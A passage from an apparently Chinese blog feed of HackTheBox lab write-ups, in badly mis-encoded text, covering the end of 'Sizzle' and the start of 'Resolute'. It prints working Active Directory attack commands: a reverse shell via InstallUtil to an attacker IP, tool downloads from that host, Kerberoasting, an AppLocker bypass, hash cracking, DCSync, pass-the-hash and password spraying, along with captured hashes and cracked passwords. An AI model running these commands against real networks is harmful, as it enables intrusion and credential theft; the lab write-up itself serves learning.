alt="image-20240715150558016"></p><p>çŒœæµ‹æ˜¯èº«ä»½éªŒè¯å‡ºäº†é—®é¢˜</p><h1 id="é€šè¿‡è·å–çš„è¯ä¹¦å®ç°ç™»å½•"><a href="#é€šè¿‡è·å–çš„è¯ä¹¦å®ç°ç™»å½•" class="headerlink" title="é€šè¿‡è·å–çš„è¯ä¹¦å®ç°ç™»å½•"></a>é€šè¿‡è·å–çš„è¯ä¹¦å®ç°ç™»å½•</h1><p>ä¹‹å‰<code>web</code>æœåŠ¡æœ‰ä¸ªç™»é™†ç•Œé¢ï¼Œå°è¯•æ‹¿<code>amanda</code>çš„ç”¨æˆ·åç™»å½•</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715150537725-584889206.png" alt="image-20240715150537115"></p><p>ç™»é™†æˆåŠŸ</p><p>è¿™ä¸ªç½‘ç«™å…è®¸æˆ‘ç”Ÿæˆä¸€ä¸ªè¯ä¹¦ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¯¥è¯ä¹¦æ¥è¿›è¡Œèº«ä»½éªŒè¯</p><p>æˆ‘ä»¬å¯ä»¥åˆ›å»ºè‡ªå·±çš„è¯ä¹¦ç­¾åè¯·æ±‚ (<code>csr</code>) å’Œå¯†é’¥ï¼Œç„¶åå°†è¯¥ <code>CSR</code> æäº¤ç»™æœåŠ¡å™¨ï¼Œå®ƒä¼šè¿”å›ç»™æˆ‘ä¸€ä¸ªè¯ä¹¦ã€‚</p><p>é¦–å…ˆä½¿ç”¨ <code>openssl</code>åˆ›å»º <code>CSR</code> å’Œå¯†é’¥</p><p><code>openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715153140520-1221636402.png" alt="image-20240715153139686"></p><p>æŒ‰ç…§ç½‘ç«™ä¸Šçš„æ­¥éª¤æäº¤æˆ‘ä»¬çš„è¯ä¹¦è¯·æ±‚</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715153928398-419142793.png" alt="image-20240715153926792"></p><p>æ¥ç€ç‚¹å‡»é«˜çº§è¯ä¹¦è¯·æ±‚</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715153942831-898952688.png" alt="image-20240715153942674"></p><p>å‡†å¤‡å¥½æˆ‘ä»¬çš„è¯ä¹¦ç­¾å</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715154050380-1923290039.png" alt="image-20240715154049876"></p><p>å°†å…¶ç²˜è´´åˆ°ç½‘ç«™ä¸­åç‚¹å‡»æäº¤</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715154147499-1427367506.png" alt="image-20240715154147144"></p><p>è¯ä¹¦ç”ŸæˆæˆåŠŸ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715162307496-991142482.png" alt="image-20240715162307140"></p><p>è¯ä¹¦ä¸‹è½½åç§»è‡³æœ¬ç›®å½•ä¸‹</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715162436611-174996876.png" alt="image-20240715162429122"></p><p>æœ‰äº†è¯ä¹¦å’Œå¯†é’¥å¯ä½¿ç”¨<code>evil-winrm</code>ä»¥<code>amanda</code>æ¥è¿›è¡Œèº«ä»½éªŒè¯ã€‚éœ€è¦æ³¨æ„çš„æ˜¯éœ€è¦åœ¨ç«¯å£<code>5689</code>ä¸Šè¿æ¥</p><p><code>evil-winrm -c certnew.cer -k amanda.key -i 10.10.10.103 -u amanda -p Ashare1972 -S</code></p><p>è¿™é‡Œä½¿ç”¨<code>-S</code>å‚æ•°æ¥æŒ‡å®šä½¿ç”¨<code>ssl</code>è¯ä¹¦ç™»å½•</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715165028826-1008718515.png" alt="image-20240715165027041"></p><h1 id="ADåŸŸæ¨ªç§»"><a href="#ADåŸŸæ¨ªç§»" class="headerlink" title="ADåŸŸæ¨ªç§»"></a>ADåŸŸæ¨ªç§»</h1><h2 id="ç¯å¢ƒå—é™"><a href="#ç¯å¢ƒå—é™" class="headerlink" title="ç¯å¢ƒå—é™"></a>ç¯å¢ƒå—é™</h2><p>å‘ç°è¿™ä¸ªç”¨æˆ·çš„æ¡Œé¢æ²¡æœ‰æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿ï¼Œè¿˜éœ€è¦ç»§ç»­æ¢æµ‹ï¼Œä½†æ˜¯ç”¨è‡ªå¸¦çš„<code>uplaod</code>ä¼ æ–‡ä»¶ä¼ ä¸ä¸Šå»ï¼Œçœ‹äº†ä¸‹æŠ¥é”™ï¼Œä¹Ÿåœ¨ç½‘ä¸Šæœäº†ä¸€ä¸‹ï¼Œå‘ç°æˆ‘ä»¬å¯èƒ½æ˜¯å¤„äº <code>PowerShell</code> çº¦æŸè¯­è¨€æ¨¡å¼ï¼Œä»¥ä¸‹å‘½ä»¤å¯ä»¥æ£€æŸ¥å½“å‰<code>powershell</code>çš„æ¨¡å¼</p><p><code>$executioncontext.sessionstate.languagemode</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715192636382-579310471.png" alt="image-20240715192634771"></p><p>æ­¤æ—¶æˆ‘ä»¬å¾—åˆ°çš„æ˜¯ä¸€ä¸ªä½æƒé™<code>PS</code>æ§åˆ¶å°ï¼Œå¹¶ä¸”æ”¹ç”¨<code>PowerShell Version 2</code>å¼•æ“ä¹Ÿæ— æ³•æ‘†è„±è¿™ç§æƒ…å†µï¼Œç”±äº<code>AppLocker</code>å°†<code>PowerShell</code>ä»¥çº¦æŸæ¨¡å¼è¿è¡Œï¼Œæ”»å‡»è€…æ— æ³•å°†<code>PowerShell</code>è¯­è¨€æ¨¡å¼æ›´æ”¹ä¸ºå®Œæ•´æ¨¡å¼ä»¥è¿è¡Œæ”»å‡»å·¥å…·ï¼Œæ— æ³•ä½¿ç”¨æ ¸å¿ƒè¯­è¨€åŠŸèƒ½ï¼ˆä¾‹å¦‚ï¼Œåœ¨å†…å­˜ä¸­åŠ è½½è„šæœ¬ç­‰ç­‰â€¦â€¦ï¼‰æ˜¯å¾ˆéš¾å—çš„ä¸€ä»¶äº‹æƒ…ã€‚</p><p>å°è¯•å‘ç°ä¸€ä¸‹åŸŸå†…çš„æˆå‘˜ä¿¡æ¯</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715193810763-1805696027.png" alt="image-20240715193810323"></p><p>å»<code>Users</code>ç›®å½•æŸ¥çœ‹ä¿¡æ¯</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715194308226-560865564.png" alt="image-20240715194307427"></p><p>å‘ç°æœ‰è¿˜æœ‰<code>sizzler</code>å’Œ<code>mrlky</code>ç”¨æˆ·ï¼Œä½†æ˜¯æƒé™å¤ªä½ï¼Œçœ‹ä¸äº†ç›¸å…³ä¿¡æ¯</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715194339783-1164341773.png" alt="image-20240715194338217"></p><p><code>Get-AppLockerPolicy -Effective -XML</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715202041953-1069118467.png" alt="image-20240715202034344"></p><p>å‘ç°è¿˜æœ‰<code>AppLocker</code>é™åˆ¶</p><h2 id="BypassCLM"><a href="#BypassCLM" class="headerlink" title="BypassCLM"></a>BypassCLM</h2><p>é¦–å…ˆå°±æ˜¯çªç ´<code>powershell</code>çº¦æŸè¯­è¨€æ¨¡å¼ï¼ŒæŸ¥æ‰¾å‘ç°ä½¿ç”¨ PSByPassCLM å¯çªç ´<code>powershell</code>çº¦æŸè¯­è¨€æ¨¡å¼</p><p>å·¥å…·ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/padovah4ck/PSByPassCLM">PSByPassCLM</a></p><p>å› ä¸ºä¹‹å‰ä¼ æ–‡ä»¶ä¼šæœ‰æŠ¥é”™ï¼Œæ‰€ä»¥å…ˆåœ¨æœ¬æœºå¼€ä¸ª<code>python</code>çš„<code>http</code>æœåŠ¡</p><p><code>python3 -m http.server 80</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715203400670-1053471516.png" alt="image-20240715203359069"></p><p>åœ¨æœºå™¨ä¸Šæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å³å¯å°†æœ¬åœ°æ–‡ä»¶ä¸‹è½½åˆ°æœºå™¨ä¸Š</p><p><code>wget http://10.10.14.28/PsBypassCLM.exe -OutFile PsBypassCLM.exe</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715203545502-881304560.png" alt="image-20240715203537943"></p><p>åŒæ—¶åœ¨æœ¬åœ°å¼€å¯ç›‘å¬æœåŠ¡</p><p><code>nc -lvp 8888</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715204058957-49124056.png" alt="image-20240715204055299"></p><p>é¶æœºä¸Šåˆ©ç”¨<code>PsBypassCLM</code>æ‰§è¡Œå‘½ä»¤ç»•è¿‡<code>CLM</code>å®Œæˆåå¼¹shell</p><p><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.14.28 /rport=8888 \users\amanda\Documents\PsBypassCLM.exe</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715204845934-1212222572.png" alt="image-20240715204844560"></p><p>åå¼¹shellæˆåŠŸï¼Œå¹¶ä¸”æˆåŠŸçªç ´äº†<code>powershell</code>çº¦æŸè¯­è¨€æ¨¡å¼</p><h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><p>åœ¨æ–°çš„ä¼šè¯ä¸­æŸ¥çœ‹ç«¯å£å¼€æ”¾æƒ…å†µ</p><p><code>netstat -ano</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715205626202-1739744831.png" alt="image-20240715205624669"></p><p>å‘ç°åœ¨ä¹‹å‰æ‰«æç«¯å£çš„æ—¶å€™å¹¶æ²¡æœ‰æ‰«æåˆ°88ç«¯å£ï¼Œè¯´æ˜è¯¥ç«¯å£å¯èƒ½å·²è¢«é˜²ç«å¢™å±è”½ï¼Œä½†æ˜¯åœ¨æœºå™¨ä¸Šå¼€æ”¾äº†88ç«¯å£ï¼Œï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>Kerberoast</code>ï¼Œåœ¨è¿™ä¹‹å‰éœ€è¦è·å–<code>Kerberoast</code></p><p>è¿™é‡Œä½¿ç”¨<code>Rubeus</code>å·¥å…·æ¥è·å–</p><ul><li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></li></ul><p>è¯¥å·¥å…·éœ€è¦è‡ªå·±ç¼–è¯‘<code>C#</code>æ¥ç”Ÿæˆ<code>exe</code>æ–‡ä»¶</p><p>åŒæ ·åˆ©ç”¨<code>`python</code>çš„<code>http</code>æœåŠ¡å°†<code>exe</code>ä¸Šä¼ è‡³é¶æœº</p><p><code>wget http://10.10.14.28/Rubeus.exe -outfile Rubeus.exe</code></p><p>åœ¨æ–°çš„ä¼šè¯çª—å£ä¸­è¿è¡Œå‘½ä»¤</p><p><code>.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716100921540-393901722.png" alt="image-20240716100917944"></p><p>å‘ç°è¿˜æœ‰é—®é¢˜ï¼Œå¤šåŠæ˜¯ç”±<code>AppLocker</code>é™åˆ¶å¯¼è‡´çš„ï¼Œæ‰€ä»¥è¿˜éœ€è¦ç»•è¿‡<code>AppLocker</code>é™åˆ¶</p><h2 id="Bypass-AppLocker"><a href="#Bypass-AppLocker" class="headerlink" title="Bypass-AppLocker"></a>Bypass-AppLocker</h2><p>è¿™é‡Œç»™ä¸€ä¸ªä¸å—<code>APPLocker</code>ä¸­<code>PowerShell</code>çº¦æŸè¯­è¨€æ¨¡å¼å½±å“çš„è·¯å¾„</p><p>æ‰“å°æœºé©±åŠ¨ç¨‹åºç›®å½•ï¼š<code>C:\Windows\System32\spool\drivers\color\</code></p><p>å°†<code>Rubeus.exe</code>ä¼ åˆ°è¿™ä¸ªç›®å½•ä¸‹å†æ‰§è¡Œå‘½ä»¤</p><p><code>.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716113734989-1612727273.png" alt="image-20240716113730945"></p><p>ç°åœ¨æˆ‘ä»¬æ‹¿åˆ°äº†<code>mrlky</code>ç”¨æˆ·çš„<code>TGS</code>ç¥¨æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle@HTB.LOCAL*$303273AECC274ADF0D56393740ECBF1F$CC9D7AF049DFFC407CBA5AD753429F1609BD82F56372EEBD77C3E3C06CBA802DF56DFA81F043B7CEB4CA8F62FF7CF10BBE5F7EA6F8D48DC23CAD4B02D22842B816B5AB44682EA9AF1719015B23880E96C7DC98FE7F17DFA225EDDD357FBD7DF7479E6E16D08DF2EAD8576D726686D53AE8A10AF784A5A5C0E6686C48B9C1A34EE886C5114DBE1A889C0EB5FC79DDD9AE74EFDC1D61FC3828EE1B95E160A575453D1A2ABE6B140ECBE41DC055329CD54EEF9797D4276384EF73A6C531121476117FCC6633777D871397F553D04BF3ACE929B4F7D7BDC1287E7398D1023C4424D8DF0B143C4D3C6A4EEC295A09C41214CD08E692A2DFD602D5F3673932AA146A06B423C3A31F8F4D5F1AB64A0E64CABA76AC7D52207EEB32EC2AB7943237A3BFCC1F5A196182F7FE40A4BB237F31D54E231E9C8E8D12D22FCA1FAEB7DD30AF193EC1D73D7C057C0FCC0725F2FCF6A04C46AF3E776828AE29452B4DD9292F607082B93F13D3EF71F9AE488BE3903EA8A36A7F167626E758D2E949A5300C6E3A467152BA5D1339B2F1EB2DB221481B1B0C2C0716D2339970E081D83A8CF083DEFFA835DAF5A98AE975094DC352FCE733D6FF58336C7A44890ED844D391876B4C85CBED748D310B81B5ED4BF89C184941D4F9623A6F1BF1A94290F9D5D5189B014BFFC48F21788DAE22A7841D716E95E4B576277C80690FFBB49AE8B218DBFF6C540CE815B5AAAEC1E838719048886ACDC539A637DF26DFB4F21FDACE84D247C789B381F3381CBC21D319A0C19AB24187B96C4B7EC2DC009E3CE13DBD4E41561F26FAB3D9222622AD4F072454F247557E0AA2A9DD1C9574707A2AC3BE27B913B8B1387404109A1050619ACD87812566D324C0836934E05760F426872FAF5E24D6F076AE0C1225E8DF9B2102105ED275F8EB8C312150D418044F841684F56A70F07A07FC6B5417D3B4D44E3518DD11A8273E7DD006F03643F5766719034C54FEC044A7DA375F2219710CC5A3F0A2E4E721FB6F3A7AA3F20126836BB2120FCBDA4FF995C2DC84AECF736BD326B898171405DFBA5833D0563A8E211AB5F198D154A9C98DEF8335BB71CEC3810295F406C14AB98051F2A8E181FBA1FF712208316284254F854FB7E98954B1D8CA3B5360CB7FC7A1FA63FAF60A3D7516C90FAC94345862E2E2278E27B7131A6FE3D2529FA8B9694BD377401C185DF01EEBDD65E1B46C57B949CBB550F4FE14395EF75033EF319D2BEDC7B3D1F81E8C850A71DB696A33840C950C032C9B337543D0F0A28F1CD1B78897CABB3219497FDF7BBB5ED4D0F340A8D34EC14176F71D214C6BBB402824DD29101F819610A21405C3A0292E62C494758D0723716188</span><br></pre></td></tr></table></figure><h2 id="NTLMå“ˆå¸Œç ´è§£"><a href="#NTLMå“ˆå¸Œç ´è§£" class="headerlink" title="NTLMå“ˆå¸Œç ´è§£"></a>NTLMå“ˆå¸Œç ´è§£</h2><p>å°†ä¸Šè¿°<code>hash</code>å€¼ä¿å­˜åˆ°æ–‡ä»¶<code>spn-hash</code>ä¸­ï¼Œä½¿ç”¨<code>john</code>çˆ†ç ´</p><p><code>john spn-hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716114611543-2034764138.png" alt="image-20240716114607870"></p><p><code>john spn-hash -show</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716114618446-173345972.png" alt="image-20240716114615195"></p><p>è¿™æ ·å°±æ‹¿åˆ°äº†<code>mrlky</code>çš„æ˜æ–‡å¯†ç ï¼š<code>Football#7</code></p><h2 id="evil-winrmè¯ä¹¦ç™»å½•"><a href="#evil-winrmè¯ä¹¦ç™»å½•" class="headerlink" title="evil-winrmè¯ä¹¦ç™»å½•"></a>evil-winrmè¯ä¹¦ç™»å½•</h2><p>æ­£å¸¸ç™»å½•<code>evil-winrm</code>è¿˜æ˜¯ç™»å½•ä¸äº†ï¼Œè·Ÿä¹‹å‰ä¸€æ ·ï¼Œåˆ©ç”¨<code>web</code>é¡µé¢ç”Ÿæˆè¯ä¹¦ï¼Œæ‹¿è¯ä¹¦ç™»å½•</p><p>é¦–å…ˆä½¿ç”¨ <code>openssl</code>åˆ›å»º<code>mrlky</code>çš„<code>CSR</code>å’Œå¯†é’¥</p><p><code>openssl req -newkey rsa:2048 -nodes -keyout mrlky.key -out mrlky.csr</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716141451172-153851049.png" alt="image-20240716141446345"></p><p>é‡å¤ä¹‹å‰çš„æ“ä½œæœ€ç»ˆä¼šå¾—åˆ°ä¸€ä¸ªæ–°çš„è¯ä¹¦</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716141839775-1368628577.png" alt="image-20240716141836559"></p><p>è¿™é‡Œä¸ºäº†è·Ÿä¹‹å‰çš„è¯ä¹¦åŒºåˆ†å¼€æ¥ï¼Œå°±æ¢äº†ä¸ªåå­—<code>mrlkynew.cer</code>ï¼Œä½†æ˜¯ä¸å½±å“ç™»å½•</p><p><code>evil-winrm -c mrlkynew.cer -k mrlky.key -i 10.10.10.103 -u mrlky -p Football#7 -S</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716142040045-2006970951.png" alt="image-20240716142036513"></p><p>ç™»é™†æˆåŠŸ</p><p>ç°åœ¨ç™»é™†çš„æ˜¯<code>mrlky.HTB</code>ç”¨æˆ·ï¼Œåœ¨ä»–çš„æ¡Œé¢ä¸Šå¹¶æ²¡æœ‰æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿ã€‚é€šè¿‡æŸ¥çœ‹ç”¨æˆ·å‘ç°ï¼Œè¿˜æœ‰ä¸€ä¸ª<code>mrlky</code>çš„ç”¨æˆ·ï¼Œæœ€ååœ¨<code>mrlky</code>çš„<code>Desktop</code>ä¸Šæ‰¾åˆ°<code>user.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716142441255-381007509.png" alt="image-20240716142438044"></p><h1 id="ADåŸŸææƒ"><a href="#ADåŸŸææƒ" class="headerlink" title="ADåŸŸææƒ"></a>ADåŸŸææƒ</h1><h2 id="Python-Bloodhoundä¿¡æ¯æœé›†"><a href="#Python-Bloodhoundä¿¡æ¯æœé›†" class="headerlink" title="Python-Bloodhoundä¿¡æ¯æœé›†"></a>Python-Bloodhoundä¿¡æ¯æœé›†</h2><p><code>bloodhound-python -c all -u mrlky -p Football#7 -d htb.local -ns 10.10.10.103</code></p><p>å¾—åˆ°çš„æ–‡ä»¶æ‹¿<code>bloodhound</code>æ‰“å¼€åˆ†æ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715192108385-865177832.png" alt="image-20240715192107875"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716143122067-946821219.png" alt="image-20240716143118655"></p><p>å‘ç°<code>mrlky</code>æœ‰<code>GetChangesALL</code>æƒé™å¯ä»¥ç›´æ¥è¿›è¡Œ<code>dcsync</code>æ”»å‡»</p><h2 id="DCSyncæ”»å‡»"><a href="#DCSyncæ”»å‡»" class="headerlink" title="DCSyncæ”»å‡»"></a>DCSyncæ”»å‡»</h2><p><code>python3 /usr/share/doc/python3-impacket/examples/secretsdump.py mrlky:Football#7@10.10.10.103</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716144053985-1944936331.png" alt="image-20240716144050521"></p><p>æ‹¿åˆ°<code>Administrator</code>çš„<code>hash</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267</span><br></pre></td></tr></table></figure><h2 id="PTHä¼ é€’æ”»å‡»ç™»å½•ç®¡ç†å‘˜"><a href="#PTHä¼ é€’æ”»å‡»ç™»å½•ç®¡ç†å‘˜" class="headerlink" title="PTHä¼ é€’æ”»å‡»ç™»å½•ç®¡ç†å‘˜"></a>PTHä¼ é€’æ”»å‡»ç™»å½•ç®¡ç†å‘˜</h2><p>æ‹¿åˆ°äº†ç®¡ç†å‘˜çš„<code>hash</code>ï¼Œå°±å¯ä»¥é€šè¿‡<code>wmiexec</code>å“ˆå¸Œä¼ é€’æ‹¿åˆ°ç®¡ç†å‘˜ç”¨æˆ·çš„æƒé™</p><p><code>python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267 administrator@10.10.10.103</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716144324075-1639180140.png" alt="image-20240716144320564"></p><p>æˆåŠŸæ‹¿åˆ°ç®¡ç†å‘˜æƒé™</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716144519997-1994691611.png" alt="image-20240716144516769"></p><p>æœ€åä¹Ÿæ˜¯åœ¨<code>Desktop</code>ä¸Šæ‰¾åˆ°<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">HackTheBoxç¯‡åŸŸæ¸—é€ç³»åˆ—ä¹‹Sizzle</summary>
    
    
    
    <category term="HackTheBox" scheme="https://www.fomal.cc/categories/HackTheBox/"/>
    
    
    <category term="HTB" scheme="https://www.fomal.cc/tags/HTB/"/>
    
    <category term="åŸŸæ¸—é€" scheme="https://www.fomal.cc/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Resolute</title>
    <link href="https://www.fomal.cc/posts/6134d881.html"/>
    <id>https://www.fomal.cc/posts/6134d881.html</id>
    <published>2024-07-12T06:30:34.000Z</published>
    <updated>2024-10-06T08:25:10.024Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>é¶æœºipï¼š10.10.10.169</p><p>æ”»å‡»æœºipï¼š10.10.14.28</p></blockquote><h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><ul><li>å¯†ç å–·æ´’</li><li>åˆ©ç”¨DnsAdminsææƒ</li></ul><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="nmapæ‰«æ"><a href="#nmapæ‰«æ" class="headerlink" title="nmapæ‰«æ"></a>nmapæ‰«æ</h2><p>æ‹¿<code>nmap</code>æ‰«ä¸€ä¸‹</p><p><code>nmap -sS -sV -sC 10.10.10.169</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712152502867-231239340.png" alt="image-20240712152500615"></p><p>åˆ†æå‘ç°æœ‰<code>DNS</code>æœåŠ¡ã€<code>kerberos</code>æœåŠ¡ã€<code>ldap</code>æœåŠ¡ã€<code>smb</code>æœåŠ¡ï¼ŒåŸŸåä¸º<code>megabank.local</code></p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>ç®€å•æµ‹è¯•ä¸€ä¸‹</p><p><code>smbclient -L //10.10.10.169</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712152804340-1683391527.png" alt="image-20240712152802524"></p><p>åŒ¿åç™»é™†æˆåŠŸä½†æ˜¯æ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯</p><h2 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h2><p><code>ldapsearch -H ldap://10.10.10.169:389 -x -s base -b &quot;&quot; namingcontexts</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712153256941-2017644621.png" alt="image-20240712153255680"></p><p>ä¹Ÿæ²¡å•¥æœ‰ç”¨ä¿¡æ¯</p><h2 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h2><p>åˆ©ç”¨RPCè¿œç¨‹è¿‡ç¨‹è°ƒç”¨æšä¸¾ç”¨æˆ·</p><p><code>rpcclient -U &quot;&quot; -N 10.10.10.169</code></p><p>æšä¸¾ç”¨æˆ·</p><p><code>enumdomusers</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712153719898-11121245.png" alt="image-20240712153719000"></p><p>æ˜¾ç¤ºç”¨æˆ·è¯¦ç»†åˆ—è¡¨ä¿¡æ¯</p><p><code>querydispinfo</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712155153559-329641798.png" alt="image-20240712155152658"></p><p>æ‰¾åˆ°ç”¨æˆ·åå¯†ç ï¼š<code>marko : Welcome123!</code></p><p>å°è¯•<code>rpcclient</code>å’Œ<code>smbclient</code>ç™»å½•</p><p> <code>smbclient -U marko -L //10.10.10.169</code></p><p><code>rpcclient -U marko -N 10.10.10.169</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712161106863-713337375.png" alt="image-20240712161105981"></p><p>éƒ½å¤±è´¥äº†ã€‚</p><h1 id="å¯†ç å–·æ´’"><a href="#å¯†ç å–·æ´’" class="headerlink" title="å¯†ç å–·æ´’"></a>å¯†ç å–·æ´’</h1><p>æ—¢ç„¶<code>marko</code>ç”¨æˆ·ç™»å½•ä¸ä¸Šï¼Œä¸å¦¨æ‹¿è¿™ä¸ªå¯†ç å»è¯•è¯•å…¶ä»–çš„ç”¨æˆ·ï¼Œåˆ©ç”¨<code>crackmapexec</code>å·¥å…·å°è¯•å¯†ç å–·æ´’æ”»å‡»</p><p>å…ˆå°†ä¹‹å‰é€šè¿‡<code>rpcclient</code>çš„<code>enumdomusers</code>å‘½ä»¤æ‹¿åˆ°çš„ç”¨æˆ·ååˆ—è¡¨ä¿å­˜ä¸º<code>users</code></p><p>å†™ä¸ª<code>python</code>è„šæœ¬å°†å…¶æå–åˆ°<code>users.txt</code>ä¸­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ‰“å¼€uusers.txtæ–‡ä»¶è¿›è¡Œè¯»å–</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;users&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> infile:</span><br><span class="line">    lines = infile.readlines()</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å¼€user.txtæ–‡ä»¶è¿›è¡Œå†™å…¥</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;users.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="comment"># ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…useråé¢çš„ç”¨æˆ·å</span></span><br><span class="line">        <span class="keyword">import</span> re</span><br><span class="line">        <span class="keyword">match</span> = re.search(<span class="string">r&#x27;user:\[(.*?)\]&#x27;</span>, line)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">            username = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">            <span class="comment"># å°†ç”¨æˆ·åå†™å…¥user.txtæ–‡ä»¶ä¸­</span></span><br><span class="line">            outfile.write(username + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712162109450-1203669142.png" alt="image-20240712162108457"></p><p>ä½¿ç”¨<code>crackmapexec</code>è¿›è¡Œå¯†ç å–·æ´’</p><p><code>crackmapexec smb 10.10.10.169 -u ./users.txt -p Welcome123!</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712162354838-1404006531.png" alt="image-20240712162353688"></p><p>å‘ç°<code>melanie</code>ç”¨æˆ·å¯ä»¥ç™»å½•ï¼Œä½¿ç”¨<code>evil-winrm</code>ç™»å½•</p><p><code>evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712162935023-164823517.png" 